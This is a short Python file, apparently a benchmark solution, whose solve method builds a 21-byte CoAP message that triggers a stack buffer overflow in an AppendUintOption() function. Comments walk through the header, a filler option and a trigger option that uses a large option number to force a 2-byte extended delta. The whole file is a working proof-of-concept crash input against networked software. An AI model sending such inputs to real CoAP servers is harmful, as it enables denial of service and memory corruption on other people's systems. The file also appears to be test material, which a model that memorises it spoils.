class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a Proof-of-Concept (PoC) input that triggers a stack buffer
        overflow in the AppendUintOption() function.

        The PoC is a 21-byte CoAP message. It is designed to be sent to a
        server that reflects options from the request into its response. The
        vulnerability is triggered when the server attempts to construct the
        response message in a small, fixed-size stack buffer.

        The PoC consists of three parts:
        1. A 4-byte standard CoAP header.
        2. A 10-byte "filler" option that consumes most of the buffer space.
        3. A 7-byte "trigger" option. The encoding of this option is made
           intentionally large by using a high option number, which forces
           the use of a 2-byte extended delta field in the CoAP option format.
           When this large option is appended, it overflows the stack buffer.
        """

        # 1. CoAP Header (4 bytes)
        # Version=1, Type=CON (0), TokenLength=0, Code=GET (1), MessageID=0x1234
        header = b'\x40\x01\x12\x34'

        # 2. Filler Option (10 bytes)
        # This option is used to fill the server's response buffer.
        # We use Option Number 3 (Uri-Host).
        # Delta = 3 (since previous option number is 0). Length = 9.
        # Header byte is (delta=3 << 4) | (length=9) = 0x39.
        filler_option = b'\x39' + (b'A' * 9)

        # 3. Trigger Option (7 bytes)
        # This option's encoding is larger than the likely remaining buffer space.
        # We use a large option number (65000) to create a large delta, forcing
        # a 2-byte extended delta, thus increasing the encoded size.
        # Previous Option Number = 3. Current = 65000. Delta = 64997.
        # For deltas >= 269, the delta nibble is 14.
        # The extended delta is a 2-byte value: 64997 - 269 = 64728 = 0xfcd8.
        # The value is a uint, we use 4 bytes. Length = 4.
        # Header byte is (delta_nibble=14 << 4) | (length=4) = 0xE4.
        trigger_option = b'\xe4\xfc\xd8' + (b'B' * 4)

        # Assemble the final PoC.
        # Total length = 4 (header) + 10 (filler) + 7 (trigger) = 21 bytes.
        poc = header + filler_option + trigger_option

        return poc
